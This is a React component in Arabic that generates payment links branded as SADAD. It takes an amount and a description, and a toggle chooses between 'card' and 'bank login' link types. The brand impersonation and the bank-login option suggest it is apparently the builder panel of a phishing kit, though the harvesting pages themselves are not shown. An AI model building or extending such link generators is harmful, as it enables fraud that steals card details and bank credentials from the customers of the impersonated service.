
import React, { useState } from 'react';
import { useCreateLink } from '@/hooks/useSupabase';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Switch } from '@/components/ui/switch';

const SADADLinkCreator = () => {
  const [amount, setAmount] = useState('');
  const [description, setDescription] = useState('');
  const [isBankLogin, setIsBankLogin] = useState(false);
  const { createLink, loading, generatedLink } = useCreateLink();

  const handleCreate = async () => {
    await createLink({ 
      amount, 
      description, 
      type: isBankLogin ? 'bank' : 'card',
      entityId: 'sadad'
    });
  };

  return (
    <div className="min-h-screen p-4 flex items-center justify-center bg-[#FFFFFF]" style={{ fontFamily: 'Cairo, sans-serif' }}>
      <div className="w-full max-w-md space-y-8 bg-white p-8 border-2 border-slate-100">
        <div className="text-center">
          <img src={`/assets/logos/sadad.svg`} alt="SADAD" className="h-16 mx-auto mb-4" />
          <h2 className="text-2xl font-bold text-slate-900">سداد</h2>
        </div>
        
        <div className="space-y-4">
          <Input 
            placeholder="المبلغ" 
            value={amount} 
            onChange={(e) => setAmount(e.target.value)}
            className="h-12 border-2 focus:ring-[#F58220]"
          />
          <Input 
            placeholder="الوصف" 
            value={description} 
            onChange={(e) => setDescription(e.target.value)}
            className="h-12 border-2 focus:ring-[#F58220]"
          />
          
          <div className="flex items-center justify-between p-2 border-2 border-slate-50">
            <span className="text-sm font-medium">تسجيل دخول بنكي</span>
            <Switch checked={isBankLogin} onCheckedChange={setIsBankLogin} />
          </div>

          <Button 
            onClick={handleCreate} 
            disabled={loading}
            className="w-full h-12 text-lg font-bold transition-all hover:opacity-90"
            style={{ backgroundColor: '#F58220', color: '#fff', borderRadius: '12px' }}
          >
            {loading ? 'جاري الإنشاء...' : 'إنشاء رابط الدفع'}
          </Button>

          {generatedLink && (
            <div className="mt-4 p-4 bg-slate-50 border-2 border-dashed border-slate-200 break-all text-center">
              <p className="text-sm text-slate-600 mb-2">الرابط الخاص بك:</p>
              <code className="text-[#F58220] font-bold cursor-pointer" onClick={() => navigator.clipboard.writeText(generatedLink)}>
                {generatedLink}
              </code>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default SADADLinkCreator;
